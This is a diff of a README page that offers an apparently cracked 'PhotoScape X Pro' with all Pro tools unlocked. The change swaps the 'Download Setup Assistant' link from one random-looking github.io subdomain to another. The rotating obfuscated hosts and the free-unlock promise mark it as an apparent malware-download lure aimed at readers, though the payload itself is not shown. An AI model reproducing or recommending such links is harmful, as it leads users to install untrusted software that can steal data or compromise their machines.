@@ -3,7 +3,7 @@
 Upgrade your image workflow with **PhotoScape X Pro**, a feature-rich photo editor for PC. Unlock all Pro tools for batch processing, RAW editing, filters, and precision retouching — perfect for photographers, designers, and creatives.
 
 ⬇️ **Download**  
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-1E90FF?style=for-the-badge&logo=photos&logoColor=white)](https://killofarte454webin0.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-1E90FF?style=for-the-badge&logo=photos&logoColor=white)](https://photo1scapepr0xpcwe0.github.io/.github/)
 
 ---
 
